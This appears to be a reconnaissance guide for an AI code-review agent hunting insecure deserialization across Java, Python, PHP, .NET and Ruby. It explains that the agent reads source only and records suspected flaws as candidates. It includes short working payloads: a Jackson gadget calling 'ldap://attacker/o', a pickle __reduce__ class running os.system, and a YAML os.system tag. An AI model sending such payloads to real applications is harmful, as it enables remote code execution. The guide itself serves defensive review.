# insecure deserialization — for reconnaissance over source

You are READING SOURCE, not sending requests. Nothing below is a
step to perform against a running application; it is a description of where this class
of bug lives and what it looks like in code.

Use it to decide **where to read** and **what to compare**. The highest-value finding
in this class is usually an ABSENCE — a check that every sibling handler performs and
this one does not. You cannot grep for a line that was never written, so find it by
reading neighbours and noticing the disagreement.

Record what you find with `record_surface` as a candidate, citing file and line. A
candidate is a suspicion with evidence, never a proven vulnerability.

## Where this lives

**Formats**
- Java: Java native serialization, XStream, JSON → object mappers (Jackson, Fastjson), YAML (SnakeYAML)
- Python: `pickle`, `yaml.load` (unsafe), `marshal`, shelve
- PHP: `unserialize()`, Phar deserialization
- .NET: `BinaryFormatter`, `Json.NET TypeNameHandling`, ViewState
- Ruby: `Marshal.load`, YAML.load
- Node.js: `node-serialize`, `unserialize.js` (less common; see prototype_pollution for merge bugs)

**Input Locations**
- Cookies, session tokens, hidden form fields
- API parameters (`data`, `state`, `object`, base64 blobs)
- Message queues, WebSocket binary frames, file uploads
- Cache entries, database columns storing serialized objects

## Shapes this takes in code

### Java Deserialization

**Gadget Chains**
- Commons Collections, Commons BeanUtils, Spring, Groovy, Rome, JDK-only chains (varies by classpath)
- Tools: ysoserial (authorized testing only), manual chain selection by classpath

**Test Flow**
1. Confirm deserialization sink (HTTP param, cookie, RMI, JMX if exposed)
2. Fingerprint library versions from errors, headers, or bundled libs
3. Generate gadget payload for available chain; expect DNS/HTTP callback or command execution

**Jackson / JSON Typing**
```json
["com.sun.rowset.JdbcRowSetImpl", {"dataSourceName":"ldap://attacker/o", "autoCommit":true}]
```
When `enableDefaultTyping` or `@JsonTypeInfo` allows attacker-chosen types.

### Python Pickle

Pickle executes arbitrary code during unpickling by design:
```python
import pickle, os, base64
class Exploit:
    def __reduce__(self):
        return (os.system, ('id',))
# base64 encode pickle.dumps(Exploit()) and send as cookie/param
```

**YAML**
```yaml
!!python/object/apply:os.system ['id']
```
When `yaml.load` used instead of `yaml.safe_load`.

### PHP unserialize()

**Object Injection**
- Magic methods: `__wakeup`, `__destruct`, `__toString`, `__call`
- POP chains through framework classes (Laravel, Symfony, WordPress plugins)

**Phar Deserialization**
- Upload or reference `phar://` wrapper triggering metadata deserialization on file operations

### .NET Deserialization

**BinaryFormatter / LosFormatter**
- Never safe on untrusted input; full RCE with known gadget chains (ysoserial.net)

**Json.NET**
```json
{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework", ...}
```
When `TypeNameHandling` != `None`.

**ViewState**
- MAC disabled or weak machine keys → forge deserialized view state

### Ruby Marshal

- `Marshal.load` on user input → gadget chains in Rails/Devise versions (context-dependent)
